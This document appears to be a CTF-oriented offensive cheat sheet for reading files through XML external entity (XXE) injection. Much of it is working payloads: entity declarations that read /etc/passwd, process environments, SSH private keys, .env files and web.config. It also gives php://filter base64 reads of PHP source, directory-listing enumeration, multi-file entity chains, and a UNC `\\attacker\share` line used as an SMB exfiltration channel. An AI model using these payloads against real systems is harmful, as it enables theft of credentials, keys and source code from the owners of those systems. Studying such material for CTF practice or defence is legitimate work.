# File Read — the in-band XXE primitive

## The minimal read

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>
```

If the endpoint echoes `&x;` (registration echo, search results,
preview, error message) — the file content appears in the response.

## Path atlas — what to read first

```
Linux:    /etc/passwd /etc/hosts /etc/hostname /etc/issue
          /proc/self/environ /proc/1/environ /proc/self/cmdline
          /proc/net/tcp /proc/version /proc/mounts
          /etc/apache2/apache2.conf /etc/nginx/nginx.conf
          /var/www/html/index.php /var/www/html/.env
          /home/*/.ssh/id_rsa /root/.ssh/id_rsa
          /app/.env /var/www/.env /var/www/html/.env
          /var/log/apache2/access.log /var/log/nginx/access.log
Windows:  c:/windows/system32/drivers/etc/hosts
          c:/windows/win.ini c:/windows/system.ini c:/windows/system32/drivers/etc/hosts
          c:/inetpub/wwwroot/web.config
          c:/windows/system32/inetsrv/config/applicationhost.config
          c:/users/*/desktop/flag.txt
```

File-URL forms:

```
file:///etc/passwd
file:///c:/windows/win.ini
file://etc/passwd          — some parsers accept
/etc/passwd                — bare path (some parsers treat as file)
file:///proc/self/environ
php://filter/convert.base64-encode/resource=index.php   — PHP only
```

## The flag-hunt list — where CTF flags sit

```
/flag /flag.txt /flag.php /app/flag /var/www/flag /srv/flag
/root/flag /home/*/flag /etc/flag
.env files: /var/www/.env /app/.env
config: /var/www/html/config.php /var/www/html/.env
source: index.php app.py main.py server.js web.config
```

## The read a directory — `file:///` on a dir

- Java parsers can `file:///` list a DIRECTORY — returns filenames
- PHP `file:///etc/` fails (dir) — but `php://filter` works on files
- Useful: enumerate `/var/www/` to find `index.php`/`.env`/`config`

## The read-source-code trick — php://filter for PHP sources

PHP source files won't execute via `file://` (raw read anyway) — but if
the app *includes* the file, read it via filter to bypass execution:

```xml
<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=index.php">
<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=config.php">
```

Then decode base64 — you get the PHP source — reveals creds/flag paths.

## The directory-listing oracle — Java's `file:///dir/`

Java SAX parsers can `file:///etc/` — response/error contains the
directory listing. Enumerate `/`, `/var/www/`, `/app/` to find the
flag filename without guessing.

## Multi-file reads — parameter-entity DTD chain

```xml
<!ENTITY % a SYSTEM "file:///etc/passwd">
<!ENTITY % b SYSTEM "file:///etc/hosts">
<!ENTITY % c SYSTEM "file:///flag">
```

Compose into one doc via external DTD or `%` nesting — each becomes a
separate `&entity;` reference you place in echoed fields.

## Error-channel read — when the file path errors

`file:///nonexistent_xyz` → parser errors naming the file — the error
sometimes leaks file existence or directory listing — `error-based.md`.

## The binary-file problem — encoding errors

`file:///flag` containing `&`/`<`/`%`/binary bytes breaks substitution —
CDATA-wrap via param entities (`cdata-wrapping.md`) or `php://filter`
base64-wrap for PHP targets.

## Windows-specific paths

```xml
<!ENTITY x SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
<!ENTITY x SYSTEM "file:///c:/inetpub/wwwroot/web.config">
<!ENTITY x SYSTEM "file:///c:/users/administrator/desktop/flag.txt">
```

UNC paths `\\attacker\share` — SMB exfil channel (`oob-channels.md`).

## Falsifiers

- `file:///etc/passwd` returns empty/error on every surface →
  external-entity resolution is off; pivot to `xinclude.md` /
  `blind-xxe.md` param-entity / error-channel
- a 4xx "DOCTYPE forbidden" → parser-level hardening — `xinclude.md`

## Output to record

- the verbatim file content read + which path + which surface echoed it
